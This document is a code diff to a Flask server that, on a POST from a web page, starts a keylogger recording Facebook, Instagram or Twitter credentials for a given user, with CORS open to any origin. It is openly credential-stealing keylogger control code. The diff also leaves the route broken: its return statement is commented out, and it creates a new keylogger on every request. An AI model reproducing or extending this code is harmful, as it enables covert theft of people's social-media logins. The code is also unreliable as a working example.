@@ -25,37 +25,36 @@ def handle_preflight():
     if request.method == "OPTIONS":
         response = jsonify({"message": "CORS preflight passed"})
         response.headers.add("Access-Control-Allow-Origin", "*")
-        response.headers.add("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
+        response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
         response.headers.add("Access-Control-Allow-Headers", "Content-Type")
         return response
 
 
-keylogger_instance = None
 
 
 @app.route("/start-server", methods=["POST"])
 def start_server():
-    global keylogger_instance
+
     print("Received start recording request from page")
 
     data = request.get_json()
     platform_id = str(data.get("platform_id"))
     print("Platform ID in request is:", platform_id)
 
-    # If keylogger_instance is already running, do not create a new one
-    if keylogger_instance is None:
-        keylogger_instance = Keylogger(user_id)
-        print("New Keylogger instance created")
 
     # Start recording for the given platform
+    keylogger_instance = Keylogger(user_id)
+    print(keylogger_instance)
     if platform_id == "0":
+        # TODO: Could the infinite looping because the recording are blocking operations? 
+        #       See: https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
         keylogger_instance.start_recording(CredentialType.FACEBOOK, int(user_id))
     elif platform_id == "1":
         keylogger_instance.start_recording(CredentialType.INSTAGRAM, int(user_id))
     elif platform_id == "2":
         keylogger_instance.start_recording(CredentialType.TWITTER, int(user_id))
-
-    return jsonify({"message": "200"}), 200
+    print("Reached the end of the function")
+    # return jsonify({"message": "200"}), 200
 
 
 @app.route("/end-server", methods=["POST"])
